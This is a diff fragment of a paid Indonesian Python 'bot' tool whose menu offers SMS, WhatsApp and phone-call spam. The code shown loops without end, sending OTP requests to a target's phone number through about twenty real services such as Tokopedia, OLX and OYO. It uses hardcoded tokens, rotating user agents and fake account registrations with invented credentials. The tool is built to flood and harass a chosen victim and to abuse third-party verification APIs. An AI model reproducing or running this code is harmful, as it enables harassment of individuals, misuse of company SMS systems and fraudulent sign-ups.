+    prints(Panel(f"{P2}[{color_rich}01{P2}]. lisensi 1 minggu 50k\n{P2}[{color_rich}02{P2}]. lisensi 1 bulan 100k\n{P2}[{color_rich}03{P2}]. lisensi 2 bulan 150k\n{P2}[{color_rich}04{P2}]. permanen 250k\n{P2}[{color_rich}00{P2}]. keluar ( {M2}tools{P2} )",width=80,padding=(0,22),style=f"{color_table}"))
+    zxc = input(" pilih lisensi : ")
+    if zxc in [""]:prints(Panel(f"{P2}pilih yang bener broo jangan kosong !",width=80,padding=(0,19),style=f"{color_table}"));time.sleep(3);buy_lisenn()
+    elif zxc in ["1","01"]:os.system("xdg-open https://wa.me/+6285888222944?text=assalamualaikum+bang+mau+beli+lisensi+1+minggu");time.sleep(2);exit()
+    elif zxc in ["2","02"]:os.system("xdg-open https://wa.me/+6285888222944?text=assalamualaikum+bang+mau+beli+lisensi+1+bulan");time.sleep(2);exit()
+    elif zxc in ["3","03"]:os.system("xdg-open https://wa.me/+6285888222944?text=assalamualaikum+bang+mau+beli+lisensi+2+bulan");time.sleep(2);exit()
+    elif zxc in ["4","04"]:os.system("xdg-open https://wa.me/+6285888222944?text=assalamualaikum+bang+mau+beli+lisensi+permanen");time.sleep(2);exit()
+    elif zxc in ["0","00"]:time.sleep(2);exit()
+    else:prints(Panel(f"{P2}ngetik apan ngab !",width=80,padding=(0,28),style=f"{color_table}"));time.sleep(3);buy_lisenn()
+        
+def menu_bot():
+	prints(Panel(f"{P2}[{color_rich}01{P2}] Bot spam SMS              [{color_rich}03{P2}] Bot spam telepon\n[{color_rich}02{P2}] Bot spam WA               [{color_rich}04{P2}] Bot share FB",width=80,padding=(0,8),style=f"{color_table}"))
+	luk = input(f'input 1 sampai 4 : ')
+	if luk in(''):
+		prints(Panel(f"{P2}pilih yang bener broo jangan kosong !",width=80,padding=(0,19),style=f"{color_table}"));time.sleep(3);exit()
+	if luk in('1','01'):
+		spam_sms()
+	elif luk in('2','02'):
+		spam_wa()
+
+agent = random.choice(
+			[
+				"Mozilla/5.0 (Linux; Android 6.0.1; SM-J500M Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36",
+				"Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-G900F Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36",
+				"Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36",
+				"Dalvik/1.6.0 (Linux; U; Android 4.1.1; BroadSign Xpress 1.0.14 B- (720) Build/JRO03H)",
+				"Mozilla/5.0 (Linux; U; Android 4.1.1; en-us; BroadSign Xpress 1.0.15-6 B- (720) Build/JRO03H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30","Mozilla/5.0 (Linux; Android 5.1.1; A37fw Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36",
+				"Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36"
+				"Mozilla/5.0 (Linux; Android 10; SM-A305F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Mobile Safari/537.36"
+		]
+	)
+
+def process_data1():
+	sleep(0.10)
+	
+def spam_sms():
+	global nomor 
+	prints(Panel(f'''{P2}Contoh : {H2}+6281234567xxx''',width=80,padding=(0,8),style=f"{color_table}"))
+	nomor = input(f"{N}input no hp :{N} +62").replace("+62","")
+	if nomor == "":
+		pass
+	else:
+		while True:
+			for _ in track(range(100), description=f'{P2}tunggu sedang spam sms...'):process_data1()
+			sxp_sms()
+
+class sxp_sms:
+
+	def __init__(self):
+		self.req = requests.Session()
+		self.main()
+
+	def sms_otp_1(self, no):
+		__req__ = self.req.post("https://service.mokapos.com/account/v1/verification/phone/send",
+			headers = {
+				  "accept": "application/json, text/plain, */*",
+				  "authorization": "undefined",
+				  "save-data": "on",
+				  "user-agent": agent,
+				  "content-type": "application/json;charset=UTF-8"
+				},
+			json = {
+				 "phone_number": f"+62{no}"
+			  }
+		).text
+
+	def sms_otp_2(self, no):
+		data = json.dumps({
+					"mobile": f"0{no}",
+					"noise": "1583590641573155574",
+					"request_time": "158359064157312",
+					"access_token": "11111"
+				   })
+		__req__ = self.req.post("https://apiservice.rupiahcepatweb.com/webapi/v1/request_login_register_auth_code",
+			headers = {
+				    "accept": "text/html, application/xhtml+xml, application/json, */*",
+				    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
+				    "content-length": "166",
+				    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
+				    "origin": "https://h5.rupiahcepatweb.com",
+				    "referer": "https://h5.rupiahcepatweb.com/dua2/pages/openPacket/openPacket.html?activityId=11&invite=200219190100215723",
+				    "sec-fetch-dest": "empty",
+				    "sec-fetch-mode": "cors",
+				    "sec-fetch-site": "same-site",
+				    "user-agent": agent
+				  },
+			data = {
+				 "data": data
+			   }
+		).text
+
+	def sms_otp_3(self, no):
+		__req__ = self.req.post("https://www.olx.co.id/api/auth/authenticate",
+			headers = {
+				    "accept": "*/*",
+				    "x-newrelic-id": "VQMGU1ZVDxABU1lbBgMDUlI=",
+				    "x-panamera-fingerprint": "83b09e49653c37fb4dc38423d82d74d7#1597271158063",
+				    "user-agent": agent,
+				    "content-type": "application/json"
+				  },
+			json = {
+				 "grantType": "retry",
+				 "method": "sms",
+				 "phone": no,
+				 "language": "id"
+				}
+		).text
+
+	def sms_otp_4(self, no):
+		__req__ = self.req.post("https://www.alodokter.com/login-with-phone-number",
+			headers = {
+				    "user-agent": agent,
+				    "content-type": "application/json",
+				    "referer": "https://www.alodokter.com/login-alodokter",
+				    "accept": "application/json",
+				    "origin": "https://www.alodokter.com"
+				  },
+			json = {
+				 "user":{
+					  "phone": f"0{no}"
+					}
+				}
+		).text
+
+	def sms_otp_5(self, no):
+		__req__ = self.req.post("https://www.kelaspintar.id/user/otpverification",
+			headers = {
+				    "x-requested-with": "XMLHttpRequest",
+				    "User-Agent": agent,
+				    "Referer": "https://www.kelaspintar.id/"
+				  },
+			data = {
+				 "user_mobile": no,
+				 "otp_type": "send_otp_reg",
+				 "mobile_code": "%2B62"
+				}
+		).text
+
+	def sms_otp_6(self, no):
+		aink_sanz = random.choice(
+						[
+							"Hallo Mantan",
+							"Hallo Bangsad",
+							"Hallo Sayang",
+							"Hallo Ripper",
+							"Hallo Ngab"
+						]
+					)
+		email = random.choice(
+					[
+						"nsnsmsmksksmsm@gmail.com",
+						"lavon.lockman@gmail.com",
+						"duane_mclaughlin38@gmail.com",
+						"alfreda.lindgren@gmail.com",
+						"leonardo_kuhlman@gmail.com",
+						"lyric51@gmail.com",
+						"devonte_littel@gmail.com",
+						"newell.kuhic@gmail.com"
+					]
+				)
+		pw = random.choice(
+					[
+						"mamsmms123",
+						"Wadepak1037",
+						"waifugw1011"
+					]
+				)
+		birth_date = random.choice(
+						[
+							"13/09/1999",
+							"04/02/2022",
+							"05/02/2022",
+							"05/02/2022",
+							"06/02/2022",
+							"10/02/2022"
+						]
+	)
+		__req__ = self.req.post("https://www.matahari.com/rest/V1/thorCustomers",
+			json = {
+				"thor_customer":{
+						"name": aink_sanz,
+						"card_number": None,
+						"email_address": email,
+						"mobile_country_code": "+62",
+						"gender_id": "1",
+						"mobile_number": f"0{no}",
+						"mro": "",
+						"password": pw,
+						"birth_date": birth_date
+						}
+				},
+			headers = {
+					"Host": "www.matahari.com",
+					"x-newrelic-id": "Vg4GVFVXDxAGVVlVBgcGVlY=",
+					"origin": "https://www.matahari.com",
+					"user-agent": agent,
+					"content-type": "application/json",
+					"accept": "*/*",
+					"x-requested-with": "XMLHttpRequest",
+					"referer": "https://www.matahari.com/customer/account/create/",
+					"accept-encoding": "gzip, deflate, br",
+					"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
+				}
+
+		).text
+
+	def sms_otp_7(self, no):
+		__req__ = self.req.post("https://api.duniagames.co.id/api/user/api/v2/user/send-otp",
+			headers = {
+				    "Host": "api.duniagames.co.id",
+				    "content-length": "32",
+				    "accept": "application/json, text/plain, */*",
+				    "x-device": "cc45ed83-73bd-4a98-83e3-874e8bc11a7f",
+				    "accept-language": "id",
+				    "user-agent": agent,
+				    "ciam-type": "FR",
+				    "content-type": "application/json",
+				    "origin": "https://duniagames.co.id",
+				    "sec-fetch-site": "same-site",
+				    "sec-fetch-mode": "cors",
+				    "sec-fetch-dest": "empty",
+				    "referer": "https://duniagames.co.id/",
+				    "accept-encoding": "gzip, deflate, br"
+				  },
+			json = {
+				 "phoneNumber": f"+62{no}"
+				}
+		).text
+
+	def sms_otp_8(self, no):
+		__req__ = self.req.post("https://harvestcakes.com/register",
+			headers = {
+				    "User-Agent": agent,
+				    "Referer": "https://harvestcakes.com/register"
+				  },
+			data = {
+				 "phone": f"0{no}",
+				 "url": ""
+				}
+		).text
+
+	def sms_otp_9(self, no):
+		__req__ = self.req.post("https://identity-gateway.oyorooms.com/identity/api/v1/otp/generate_by_phone?locale=id",
+			headers = {
+				    "Host": "identity-gateway.oyorooms.com",
+				    "consumer_host": "https://www.oyorooms.com",
+				    "accept-language": "id",
+				    "access_token": "SFI4TER1WVRTakRUenYtalpLb0w6VnhrNGVLUVlBTE5TcUFVZFpBSnc=",
+				    "User-Agent": agent,
+				    "Content-Type": "application/json",
+				    "accept": "*/*",
+				    "origin": "https://www.oyorooms.com",
+				    "referer": "https://www.oyorooms.com/login",
+				    "Accept-Encoding": "gzip, deflate, br"
+				  },
+			json = {
+				 "phone": f"0{no}",
+				 "country_code": "+62",
+				 "country_iso_code": "ID",
+				 "nod": "4",
+				 "send_otp": "true",
+				 "devise_role": "Consumer_Guest"
+				}
+		).text
+
+	def sms_otp_10(self, no):
+		__req__ = self.req.post("https://crp-app.stamps.co.id/api/auth/validate-mobile-number",
+			json = {
+				"mobile_number": f"0{no}",
+				"token": "sI01tF5bOSYHabS7HaXiB1k3j0JxFxbcQ79Rd1HFBjKEKJqYAwSNMScsx9AEZq3O"
+				},
+			headers = {
+					"Host": "crp-app.stamps.co.id",
+					"content-type": "application/json; charset=utf-8",
+					"content-length": "106",
+					"accept-encoding": "gzip",
+					"User-Agent": agent
+			}
+		).text
+
+	def sms_otp_11(self, no):
+		__req__ = self.req.post("https://app-api.kredito.id/client/v1/common/verify-code/send",
+			headers = {
+				    "LPR-TIMESTAMP": "1603281035821",
+				    "Accept-Language": "id-ID",
+				    "LPR-BRAND": "Kredito",
+				    "LPR-PLATFORM": "android",
+				    "User-Agent": agent,
+				    "Authorization": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1aWQiOi0xNjAzMjgxMDE3MjAzLCJ1dHlwZSI6ImFub24iLCJleHAiOjE2MDMyODQ2MTd9._HUnW7FQmMiDWvSejS0MBqMq95l2rk_6PuxDeXY5Oks",
+				    "LPR-SIGNATURE": "e15dbea8602409df32a2ed5a123dc244",
+				    "Content-Type": "application/json; charset=UTF-8",
+				    "Content-Length": "79"
+				   },
+			data = '{"event":"default_verification","mobilePhone":"%s","sender":"jatissms"}' % no
+		).text
+
+	def sms_otp_12(self, no):
+		__req__ = self.req.post("https://www.autofun.co.id:443/v2/captcha/sms",
+			headers = {
+					"Host": "www.autofun.co.id",
+					"Connection": "keep-alive",
+					"Content-length": "84",
+					"accept": "*/*",
+					"User-Agent": agent,
+					"Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
+					"content-type": "application/json;charset=UTF-8",
+					"Origin": "https://www.autofun.co.id",
+					"X-Requested-With": "acr.browser.barebones",
+					"Sec-Fetch-Site": "same-origin",
+					"Sec-Fetch-Mode": "cors",
+					"Sec-Fetch-Dest": "empty",
+					"Referer": "https://www.autofun.co.id/mobil/datsun",
+					"Accept-Encoding": "gzip, deflate"
+				},
+			json = {
+					"phoneNum": f"62{no}",
+					"languageCode": "id-id",
+					"countryCode": "id",
+					"platform": 2
+			}
+		).text
+
+	def sms_otp_13(self, no):
+		__req__ = self.req.post("https://api.myfave.com/api/fave/v3/auth",
+			json = {
+					"phone":"+62"+no
+				},
+			headers = {
+					"Host": "api.myfave.com",
+					"Connection": "keep-alive",
+					"x-user-agent": "Fave-PWA/v1.0.0",
+					"Origin": "https://m.myfave.com",
+					"User-Agent": agent,
+					"content-type": "application/json",
+					"Accept": "*/*",
+					"Referer": "https://m.myfave.com/jakarta/auth",
+					"Accept-Encoding": "gzip, deflate, br",
+					"Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
+			}
+		).text
+
+	def sms_otp_14(self, no):
+		nickname = random.choice(
+					  [
+					    "fahmi",
+					    "xzc0der",
+					    "bed3bah",
+					    "xmanz"
+					  ]
+					)
+		angka = random.randint(
+					111,
+					999
+				      )
+		__req__ = self.req.post("https://wong.kitabisa.com/register/draft",
+			headers = {
+				    "Host": "wong.kitabisa.com",
+				    "x-ktbs-platform-name": "pwa",
+				    "origin": "https://account.kitabisa.com",
+				    "x-ktbs-time": "1611020248",
+				    "user-agent": agent,
+				    "x-ktbs-api-version": "1.0.0",
+				    "accept": "application/json",
+				    "x-ktbs-client-name": "kanvas",
+				    "x-ktbs-request-id": "107790c3-86e0-4872-9dfb-b9c5da9bfa13",
+				    "x-ktbs-client-version": "1.0.0",
+				    "x-ktbs-signature": "e6b4dd627125b3ccd53de193d165c481cc7fdfef0b1dcd7a587636a008fdc89e",
+				    "version": "3.4.0",
+				    "referer": "https://account.kitabisa.com/register/otp?type=sms",
+				    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
+				  },
+			json = {
+				 "full_name": nickname+str(angka),
+				 "username": f"62{no}",
+				 "otp_type": "sms"
+				}
+		).text
+
+	def main(self):
+		self.sms_otp_1(nomor)
+		self.sms_otp_2(nomor)
+		self.sms_otp_3(nomor)
+		self.sms_otp_4(nomor)
+		self.sms_otp_5(nomor)
+		self.sms_otp_6(nomor)
+		self.sms_otp_7(nomor)
+		self.sms_otp_8(nomor)
+		self.sms_otp_9(nomor)
+		self.sms_otp_10(nomor)
+		self.sms_otp_11(nomor)
+		self.sms_otp_12(nomor)
+		self.sms_otp_13(nomor)
+		self.sms_otp_14(nomor)
+		prints(Panel(f"{P2}Sukses spam SMS ke no : {K2}+62{nomor}",width=80,padding=(0,2),style=f"{color_table}"))
+        
+def spam_wa():
+	global nomor
+	prints(Panel(f'''{P2}Contoh : {H2}+6281234567xxx''',width=80,padding=(0,8),style=f"{color_table}"))
+	nomor = input(f"{N}input no hp :{N} +62").replace("+62","")
+	if nomor == "":
+		pass
+	else:
+		while True:
+			for _ in track(range(100), description=f'{P2}tunggu sedang spam sms...'):process_data1()
+			sxp_wa()
+			
+class sxp_wa:
+
+	def __init__(self):
+		self.req = requests.Session()
+		self.main()
+
+	def wa_otp_1(self, no):
+		nickname = random.choice(
+					  [
+					    "fahmi",
+					    "xzc0der",
+					    "bed3bah",
+					    "xmanz"
+					  ]
+					 )
+		angka = random.randint(
+					111,
+					999
+				       )
+		__req__ = self.req.post("https://wong.kitabisa.com/register/draft",
+			headers = {
+				    "Host": "wong.kitabisa.com",
+				    "x-ktbs-platform-name": "pwa",
+				    "origin": "https://account.kitabisa.com",
+				    "x-ktbs-time": "1611020248",
+				    "user-agent": agent,
+				    "x-ktbs-api-version": "1.0.0",
+				    "accept": "application/json",
+				    "x-ktbs-client-name": "kanvas",
+				    "x-ktbs-request-id": "107790c3-86e0-4872-9dfb-b9c5da9bfa13",
+				    "x-ktbs-client-version": "1.0.0",
+				    "x-ktbs-signature": "e6b4dd627125b3ccd53de193d165c481cc7fdfef0b1dcd7a587636a008fdc89e",
+				    "version": "3.4.0",
+				    "referer": "https://account.kitabisa.com/register/otp?type=sms",
+				    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
+				   },
+			json = {
+				 "full_name": nickname+str(angka),
+				 "username": f"0{no}",
+				 "otp_type": "whatsapp"
+				}
+		).text
+
+	def wa_otp_2(self, no):
+		__req__ = self.req.get(
+			f"https://m.redbus.id/api/getOtp?number={no}&cc=62&whatsAppOpted=true"
+		).text
+
+	def wa_otp_3(self, no):
+		__req__ = self.req.post("https://api.bukuwarung.com/api/v1/auth/otp/send",
+			headers = {
+				    "Accept": "application/json",
+				    "X-APP-VERSION-NAME": "3.4.0",
+				    "X-APP-VERSION-CODE": "3399",
+				    "Content-Type": "application/json; charset=UTF-8",
+				    "Host": "api.bukuwarung.com",
+				    "Connection": "Keep-Alive",
+				    "Accept-Encoding": "gzip",
+				    "User-Agent": agent
+				   },
+			json = {
+				 "action": "LOGIN_OTP",
+				 "countryCode": "62",
+				 "deviceId": "00000177-142d-f1a2-bac4-57a9039fdc4d",
+				 "method": "WA",
+				 "phone": no
+				}
+		).text
+
+	def wa_otp_4(self, no):
+		__req__ = self.req.post("https://evermos.com/api/client/request-code",
+			headers = {
+				    "user-agent": agent
+				  },
+			data = {
+				 "telephone": f"62{no}",
+				 "type": 0
+				}
+		).text
+
+	def wa_otp_5(self, no):
+		__req__ = self.req.post("https://wapi.ruparupa.com/auth/generate-otp",
+			headers = {
+				    "Host": "wapi.ruparupa.com",
+				    "Connection": "keep-alive",
+				    "Authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiOGZlY2VjZmYtZTQ1Zi00MTVmLWI2M2UtMmJiMzUyZmQ2NzhkIiwiaWF0IjoxNTkzMDIyNDkyLCJpc3MiOiJ3YXBpLnJ1cGFydXBhIn0.fETKXQ0KyZdksWWsjkRpjiKLrJtZWmtogKyePycoF0E",
+				    "Accept": "application/json",
+				    "Content-Type": "application/json",
+				    "X-Company-Name": "odi",
+				    "User-Agent": agent,
+				    "user-platform": "mobile",
+				    "X-Frontend-Type": "mobile",
+				    "Origin": "https://m.ruparupa.com",
+				    "Referer": "https://m.ruparupa.com/verification?page=otp-choices",
+				    "Accept-Encoding": "gzip, deflate, br",
+				    "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
+				   },
+			json = {
+				 "phone": f"0{no}",
+				 "action": "register",
+				 "channel": "chat",
+				 "email": "",
+				 "customer_id": "0",
+				 "is_resend": 0
+				}
+		).text
+
+	def wa_otp_6(self, no):
+		headers = {
+			    "Connection": "keep-alive",
+			    "Accept": "application/json, text/javascript, */*; q=0.01",
+			    "Origin": "https://accounts.tokopedia.com",
+			    "X-Requested-With": "XMLHttpRequest",
+			    "User-Agent": agent,
+			    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+			    "Accept-Encoding": "gzip, deflate",
+			   }
+		site = self.req.get("https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn="+ no +"&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D", headers = headers).text
+		search = re.search(r'\<input\ id\=\"Token\"\ value\=\"(.*?)\"\ type\=\"hidden\"\>', site).group(1)
+		data = {
+			 "otp_type": "116",
+			 "msisdn": no,
+			 "tk": search,
+			 "email": "",
+			 "original_param": "",
+			 "user_id": "",
+			 "signature": "",
+			 "number_otp_digit": "6",
+			}
+		__req__ = self.req.post(
+				"https://accounts.tokopedia.com/otp/c/ajax/request-wa", headers = headers, data = data
+	   ).text
+
+	def main(self):
+		self.wa_otp_1(nomor)
+		self.wa_otp_2(nomor)
+		self.wa_otp_3(nomor)
+		self.wa_otp_4(nomor)
+		self.wa_otp_5(nomor)
+		self.wa_otp_6(nomor)
+		prints(Panel(f"{P2}Sukses spam WA ke no : {K2}+62{nomor}",width=80,padding=(0,2),style=f"{color_table}"))
+        
+def makedirectory():
+	try:os.mkdir('data')
+	except:pass
+	try:os.system('result')
+	except:pass
+	login_kamu()
+
+if __name__ == '__main__':
+	os.system("git pull")
+	makedirectory()
